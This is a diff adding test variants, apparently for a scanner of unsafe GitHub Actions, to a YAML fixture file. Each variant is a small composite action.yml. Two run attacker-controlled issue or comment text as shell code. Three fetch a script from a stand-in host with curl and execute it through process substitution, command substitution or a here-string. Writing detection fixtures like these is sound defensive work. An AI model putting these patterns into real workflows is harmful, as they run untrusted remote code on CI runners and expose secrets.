@@ -44,6 +44,60 @@ not_covered: >
   and are not visible in the repository.
 
 variants:
+  - id: event-through-env-expression
+    technique: Event text passes through env and is interpolated back into a shell command.
+    files:
+      action.yml: |
+        name: Demo
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              env:
+                TITLE: ${{ github.event.issue.title }}
+              run: echo "${{ env.TITLE }}"
+  - id: event-written-then-executed
+    technique: Event text is extracted to a file and then executed by the same job.
+    files:
+      action.yml: |
+        name: Demo
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              run: |
+                jq -r '.comment.body' "$GITHUB_EVENT_PATH" > cmd.sh
+                bash cmd.sh
+  - id: run-process-substitution
+    technique: The shell in a run scalar executes a download through process substitution.
+    files:
+      action.yml: |
+        name: Demo
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              run: bash <(curl -s https://example.invalid/i.sh)
+  - id: run-command-substitution
+    technique: The shell in a run scalar executes a downloaded command substitution.
+    files:
+      action.yml: |
+        name: Demo
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              run: bash -c "$(curl -s https://example.invalid/i.sh)"
+  - id: run-here-string
+    technique: The shell in a run scalar consumes a downloaded here-string as code.
+    files:
+      action.yml: |
+        name: Demo
+        runs:
+          using: composite
+          steps:
+            - shell: bash
+              run: bash <<< "$(curl -s https://example.invalid/i.sh)"
   - id: head-ref-field
     technique: The branch name comes from pull_request.head.ref instead of github.head_ref.
     files:
